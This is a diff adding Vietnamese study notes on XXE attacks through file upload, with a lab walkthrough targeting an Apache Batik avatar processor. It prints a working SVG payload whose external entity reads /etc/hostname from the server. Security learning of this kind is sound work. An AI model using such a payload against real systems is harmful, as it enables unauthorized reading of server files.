@@ -490,3 +490,33 @@
 > ```
 >
 > ![img](../asset/xxe-Exploiting-XInclude-to-retrieve-files-1.png) ![img](../asset/xxe-Exploiting-XInclude-to-retrieve-files-2.png)
+
+---
+
+#### XXE attacks via file upload
+
+> Một số ứng dụng cho phép client upload các tệp sau đó được xử lí phía server.
+>
+> Ví dụ các định dạng dựa trên XML là các định dạng văn phòng như DOCX hay hình ảnh như SVG
+>
+> Ứng dụng cho phép upload file lên, và xử lí. Ví dụ client upload file SVG độc hại thì có thể exploit nó
+
+#### Lab: Exploiting XXE via image file upload
+
+> Des: Lab này cho phép người dùng cmt vào avatar dùng thư viện `Apache Batik`
+>
+> Để solve, tải 1 tệp hình đại diện của path: `/etc/hostname`
+
+> Thử upload:
+> ![img](../asset/xxe-Exploiting-XXE-via-image-file-upload-1.png)
+
+> Tạo file svg với content:
+>
+> ```
+> <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+> ```
+
+> ![img](../asset/xxe-Exploiting-XXE-via-image-file-upload-5.png) ![img](../asset/xxe-Exploiting-XXE-via-image-file-upload-2.png)
+
+> Post thành công thì flag nằm ở ảnh của user mình dùng để post comment:
+> ![img](../asset/xxe-Exploiting-XXE-via-image-file-upload-3.png) ![img](../asset/xxe-Exploiting-XXE-via-image-file-upload-4.png)
